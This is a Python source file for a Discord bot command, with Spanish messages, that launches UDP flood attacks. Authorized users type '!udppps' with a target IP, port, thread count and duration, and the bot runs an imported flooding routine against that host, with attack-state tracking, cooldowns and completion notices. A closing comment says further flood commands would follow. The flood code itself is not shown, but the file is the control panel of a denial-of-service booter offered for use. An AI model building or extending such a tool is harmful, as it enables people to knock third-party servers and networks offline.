import discord
from discord.ext import commands
import socket
import time
import asyncio
import threading
from random import randint
from methods.helpers import Brutalize, UDPHandShake
from embeds.attack_embed import create_attack_embed

class UDPAttackMethods:
    def __init__(self, bot, authorized_users):
        self.bot = bot
        self.authorized_users = authorized_users
    
    async def check_permissions(self, ctx):
        if str(ctx.author.id) not in self.authorized_users:
            embed = discord.Embed(
                title="❌ Permiso Denegado",
                description="No tienes permiso para usar este comando.",
                color=discord.Color.red()
            )
            embed.set_thumbnail(url="https://media.giphy.com/media/3o7TKSjRrfIPjeiVyY/giphy.gif")
            await ctx.send(embed=embed)
            return False
        return True
    
    async def check_attack_state(self, ctx):
        global attack_in_progress, last_attack_time, cooldown_seconds
        if attack_in_progress:
            embed = discord.Embed(
                title="⚠️ Ataque en Curso",
                description="Ya hay un ataque en curso",
                color=discord.Color.orange()
            )
            embed.set_thumbnail(url="https://media.giphy.com/media/3o7TKSjRrfIPjeiVyY/giphy.gif")
            await ctx.send(embed=embed)
            return False
        
        if time.time() - last_attack_time < cooldown_seconds:
            remaining = int(cooldown_seconds - (time.time() - last_attack_time))
            embed = discord.Embed(
                title="⏳ Enfriamiento",
                description=f"Debes esperar {remaining} segundos antes de lanzar otro ataque",
                color=discord.Color.orange()
            )
            embed.set_thumbnail(url="https://media.giphy.com/media/3o7TKSjRrfIPjeiVyY/giphy.gif")
            await ctx.send(embed=embed)
            return False
        
        return True
    
    @commands.command(name='udppps')
    async def udppps(self, ctx, ip: str, port: int, threads: int, tiempo: int):
        if not await self.check_permissions(ctx) or not await self.check_attack_state(ctx):
            return
        
        global attack_in_progress, last_attack_time, current_attack_stop_event
        attack_in_progress = True
        current_attack_stop_event = threading.Event()
        
        embed = create_attack_embed("UDPPPS", ip, port, tiempo, threads)
        await ctx.send(embed=embed)
        
        try:
            brute = Brutalize(ip, port, threads, stop_event=current_attack_stop_event)
            loop = asyncio.get_running_loop()
            await loop.run_in_executor(None, brute.flood, tiempo)
            
            embed = discord.Embed(
                title="✅ UDPPPS Finalizado",
                description=f"Ataque a {ip}:{port} completado",
                color=discord.Color.green()
            )
            embed.set_thumbnail(url="https://media.giphy.com/media/3o7TKSjRrfIPjeiVyY/giphy.gif")
            await ctx.send(embed=embed)
        except Exception as e:
            embed = discord.Embed(
                title="❌ Error en UDPPPS",
                description=f"Error al ejecutar UDPPPS: {e}",
                color=discord.Color.red()
            )
            embed.set_thumbnail(url="https://media.giphy.com/media/3o7TKSjRrfIPjeiVyY/giphy.gif")
            await ctx.send(embed=embed)
        finally:
            attack_in_progress = False
            last_attack_time = time.time()
            current_attack_stop_event = None
    
    @udppps.error
    async def udppps_error(self, ctx, error):
        if isinstance(error, commands.MissingRequiredArgument):
            embed = discord.Embed(
                title="❌ Uso Incorrecto",
                description="Uso correcto: `!udppps <ip> <port> <threads> <time>`",
                color=discord.Color.red()
            )
            embed.set_thumbnail(url="https://media.giphy.com/media/3o7TKSjRrfIPjeiVyY/giphy.gif")
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(
                title="❌ Error",
                description=f"Ocurrió un error: {error}",
                color=discord.Color.red()
            )
            embed.set_thumbnail(url="https://media.giphy.com/media/3o7TKSjRrfIPjeiVyY/giphy.gif")
            await ctx.send(embed=embed)
    
    # Similar methods for udpflood, udp_down, udphands would follow...
    # (Implementation would be similar to udppps but with their specific attack logic)